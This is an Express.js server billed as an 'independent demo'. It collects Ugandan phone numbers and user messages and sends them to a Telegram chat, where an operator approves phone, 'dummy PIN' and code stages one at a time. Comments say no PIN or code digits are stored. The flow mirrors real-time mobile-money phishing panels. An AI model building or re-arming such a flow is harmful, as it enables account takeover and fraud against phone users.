const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_DIR = path.join(__dirname, "public");
const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");

app.use(express.json({ limit: "10kb" }));
app.use(express.static(PUBLIC_DIR));

app.get("/", (_req, res) => {
  res.sendFile(INDEX_FILE, err => {
    if (err && !res.headersSent) {
      console.error("Homepage error:", err.message);
      res.status(404).send("Homepage not found. Check public/index.html.");
    }
  });
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const requests = new Map();

function timestamp() {
  return new Date().toISOString();
}

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error("Telegram environment variables are missing.");
  }

  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }
  );

  const result = await response.json();

  if (!response.ok || !result.ok) {
    throw new Error(result.description || "Telegram request failed.");
  }

  return result;
}

async function notifyDemo(request, stageLabel) {
  const keyboard = {
    inline_keyboard: [[
      {
        text: "Approve demo",
        callback_data: `approve:${request.id}`
      },
      {
        text: "Decline demo",
        callback_data: `decline:${request.id}`
      }
    ]]
  };

  return telegram("sendMessage", {
    chat_id: CHAT_ID,
    text: [
      "INDEPENDENT DEMO",
      `Request: ${request.id}`,
      `Demo phone: ${request.phone}`,
      `Stage: ${stageLabel}`,
      "Sensitive digits: Not collected",
      `Date/time: ${request.updatedAt || request.createdAt}`,
      "Status: PENDING"
    ].join("\n"),
    reply_markup: keyboard
  });
}

function publicRequestStatus(request) {
  return {
    stage: request.stage,
    status: request.status,
    updatedAt: request.updatedAt || null
  };
}

// Health check
app.get("/api/health", (_req, res) => {
  res.json({
    ok: true,
    service: "Independent demo"
  });
});

// Create a demo request.
// No Telegram approval message is sent until the user starts the dummy-PIN stage.
app.post("/api/phone", (req, res) => {
  const phone = String(req.body.phone || "").trim();

  if (!/^\+2567\d{8}$/.test(phone)) {
    return res.status(400).json({
      error: "Enter a valid demo phone number."
    });
  }

  const now = timestamp();

  const request = {
    id: crypto.randomUUID(),
    phone,
    stage: "pin-demo",
    status: "ready",
    createdAt: now,
    updatedAt: now
  };

  requests.set(request.id, request);

  return res.json({
    id: request.id,
    status: request.status
  });
});

// Start dummy-PIN stage.
// The endpoint deliberately ignores any submitted digits.
app.post("/api/pin-demo", async (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);

  if (
    !request ||
    request.stage !== "pin-demo" ||
    !["ready", "declined"].includes(request.status)
  ) {
    return res.status(400).json({
      error: "The demo PIN stage is not available. Restart the demo."
    });
  }

  request.status = "pending";
  request.updatedAt = timestamp();

  try {
    await notifyDemo(request, "Dummy PIN demonstration");

    return res.json({ status: "pending" });
  } catch (error) {
    request.status = "ready";

    console.error("Telegram notification failed:", error.message);

    return res.status(502).json({
      error: "Could not send the demo notification. Please try again."
    });
  }
});

// Submit an ordinary, non-sensitive demo message.
app.post("/api/message", async (req, res) => {
  const id = String(req.body.id || "");
  const message = String(req.body.message || "").trim();
  const request = requests.get(id);

  if (
    !request ||
    request.stage !== "message" ||
    request.status !== "approved"
  ) {
    return res.status(400).json({
      error: "The demo message stage is not available."
    });
  }

  if (!message || message.length > 1000) {
    return res.status(400).json({
      error: "Enter a message of 1–1000 characters."
    });
  }

  request.message = message;
  request.stage = "message-review";
  request.status = "pending";
  request.updatedAt = timestamp();

  try {
    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: [
        "INDEPENDENT DEMO — MESSAGE",
        `Request: ${request.id}`,
        `Date/time: ${request.updatedAt}`,
        "",
        "Demo message:",
        message,
        "",
        "Status: PENDING"
      ].join("\n"),
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Approve demo",
            callback_data: `approve:${request.id}`
          },
          {
            text: "Decline demo",
            callback_data: `decline:${request.id}`
          }
        ]]
      }
    });

    return res.json({ status: "pending" });
  } catch (error) {
    request.status = "approved";
    request.stage = "message";

    console.error("Telegram message failed:", error.message);

    return res.status(502).json({
      error: "Could not submit the demo message. Please try again."
    });
  }
});

// Start demo-code stage.
// The endpoint ignores all digit fields and receives only the request ID.
app.post("/api/demo-code", async (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);

  if (
    !request ||
    request.stage !== "demo-code" ||
    request.status !== "approved"
  ) {
    return res.status(400).json({
      error: "The demo-code stage is not available. Restart the demo."
    });
  }

  request.stage = "code-review";
  request.status = "pending";
  request.updatedAt = timestamp();

  try {
    await notifyDemo(request, "Dummy demo-code stage");

    return res.json({ status: "pending" });
  } catch (error) {
    request.stage = "demo-code";
    request.status = "approved";

    console.error("Telegram code-stage notification failed:", error.message);

    return res.status(502).json({
      error: "Could not send the demo status. Please try again."
    });
  }
});

// Retry a declined stage.
// Restores the relevant demo stage without collecting sensitive digits.
app.post("/api/retry", (req, res) => {
  const id = String(req.body.id || "");
  const request = requests.get(id);

  if (!request || request.status !== "declined") {
    return res.status(400).json({
      error: "There is no declined demo stage to retry."
    });
  }

  if (request.stage === "pin-demo") {
    request.status = "ready";
  } else if (request.stage === "message-review") {
    request.stage = "message";
    request.status = "approved";
  } else if (request.stage === "code-review") {
    request.stage = "demo-code";
    request.status = "approved";
  } else {
    return res.status(400).json({
      error: "This demo stage cannot be retried."
    });
  }

  request.updatedAt = timestamp();

  return res.json(publicRequestStatus(request));
});

// Telegram approval polling.
// Run only ONE server instance using this bot token.
let polling = false;
let offset = 0;

async function pollTelegram() {
  if (!BOT_TOKEN || !CHAT_ID || polling) {
    console.error("Telegram polling not started: check bot environment variables.");
    return;
  }

  polling = true;

  while (true) {
    try {
      const result = await telegram("getUpdates", {
        offset,
        timeout: 25,
        allowed_updates: ["callback_query"]
      });

      for (const update of result.result || []) {
        offset = update.update_id + 1;

        const callback = update.callback_query;
        if (!callback) continue;

        const parts = String(callback.data || "").split(":");
        const action = parts[0];
        const id = parts.slice(1).join(":");
        const request = requests.get(id);

        if (
          !request ||
          !["approve", "decline"].includes(action) ||
          request.status !== "pending"
        ) {
          await telegram("answerCallbackQuery", {
            callback_query_id: callback.id,
            text: "This demo request is no longer pending."
          });
          continue;
        }

        if (action === "approve") {
          if (request.stage === "pin-demo") {
            request.stage = "message";
          } else if (request.stage === "message-review") {
            request.stage = "demo-code";
          } else if (request.stage === "code-review") {
            request.stage = "success";
          } else {
            await telegram("answerCallbackQuery", {
              callback_query_id: callback.id,
              text: "This demo stage cannot be approved."
            });
            continue;
          }

          request.status = "approved";
        } else {
          request.status = "declined";
        }

        request.updatedAt = timestamp();

        await telegram("answerCallbackQuery", {
          callback_query_id: callback.id,
          text: action === "approve" ? "Demo approved" : "Demo declined"
        });

        if (callback.message) {
          await telegram("editMessageReplyMarkup", {
            chat_id: callback.message.chat.id,
            message_id: callback.message.message_id,
            reply_markup: { inline_keyboard: [] }
          });
        }

        await telegram("sendMessage", {
          chat_id: CHAT_ID,
          text: [
            "DEMO STATUS UPDATED",
            `Request: ${request.id}`,
            `Status: ${request.status.toUpperCase()}`,
            `Stage: ${request.stage}`,
            `Date/time: ${request.updatedAt}`
          ].join("\n")
        });
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

// Status endpoint used by index.html.
app.get("/api/status/:id", (req, res) => {
  const request = requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({
      error: "Demo request not found."
    });
  }

  return res.json(publicRequestStatus(request));
});

// Start server.
app.listen(PORT, () => {
  console.log(`Independent demo running on port ${PORT}`);
  console.log(`Serving homepage from ${INDEX_FILE}`);

  pollTelegram();
});
